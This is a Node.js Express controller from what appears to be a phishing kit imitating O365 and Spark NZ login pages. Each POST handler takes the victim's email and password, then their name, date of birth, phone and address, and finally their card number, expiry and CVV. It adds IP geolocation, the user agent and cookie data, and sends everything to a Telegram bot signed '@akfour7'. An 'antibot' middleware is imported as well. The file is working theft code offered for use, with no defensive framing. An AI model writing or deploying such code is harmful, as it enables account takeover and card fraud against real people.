const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const anti = require("../middleware/antibot2");
const getIPDetails = require("../middleware/getIPDetails");

// console.log(getIPDetails());

let storedCredentials = {
  email: "",
  password: "",
};

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  (async () => {
    const anti1 = await anti;
    const file = JSON.stringify(anti1, null, 2);

    const { email, password } = req.body;

    const iPDetails = await getIPDetails();
    const { query, city, region, country, isp } = iPDetails;

    const userAgent = req.headers["user-agent"];

    const message =
      `✅ @AKFOUR7 | O365 \n\n` +
      `👤 EMAIL ADDRESS\n` +
      `📧Email  : ${email}\n` +
      `🔑Password : ${password}\n` +
      `++++++++++++++++++++++++++++++\n\n` +
      `IP ADDRESS INFO\n` +
      `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `SYSTEM INFO || USER AGENT\n` +
      `USER AGENT       : ${userAgent}\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `COOKIES          : ${file}\n` +
      `👨‍💻 @akfour7 - TG 👨‍💻`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

    res.redirect("/auth/login/2");
  })();
};

exports.login2 = (req, res) => {
  res.render("login2");
};

exports.loginPost2 = async (req, res) => {
  const { email, password2 } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `SPARK NZ LOGIN-2\n\n` +
    `🔰Email : ${email}\n` +
    `🔑Pass : ${password2}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.personal = (req, res) => {
  res.render("personal");
};

exports.personalPost = async (req, res) => {
  const { fname, dob, phone, address } = req.body;
  const { email, password } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;
  storedCredentials = { ...storedCredentials, fname, dob, phone, address };

  const userAgent = req.headers["user-agent"];

  const message =
    `SPARK NZ FULLZ\n\n` +
    `Email  : ${email}\n` +
    `Password  : ${password}\n` +
    `Full Name  : ${fname}\n` +
    `Date of Birth  : ${dob}\n\n` +
    `PhoneNum  : ${phone}\n\n` +
    `Address  : ${address}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/card-verification");
};

exports.card = (req, res) => {
  res.render("card");
};
// storedCredentials = { email, password, fname, dob, phone, address };

exports.cardPost = async (req, res) => {
  const { cname, cardNum, exp, cvv } = req.body;
  const { email, password, fname, dob, phone, address } = storedCredentials;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `SPARK NZ CARD DETAILS\n\n` +
    `Email  : ${email}\n\n` +
    `Password  : ${password}\n\n` +
    `Fullname  : ${fname}\n\n` +
    `Date of birth  : ${dob}\n\n` +
    `PhoneNum  : ${phone}\n\n` +
    `Address  : ${address}\n\n` +
    `Fullname  : ${fname}\n\n` +
    `Name on Card  : ${cname}\n\n` +
    `CardNum  : ${cardNum}\n\n` +
    `Expiry Date  : ${exp}\n\n` +
    `CVV  : ${cvv}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/success");
};

exports.success = (req, res) => {
  return res.render("success");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
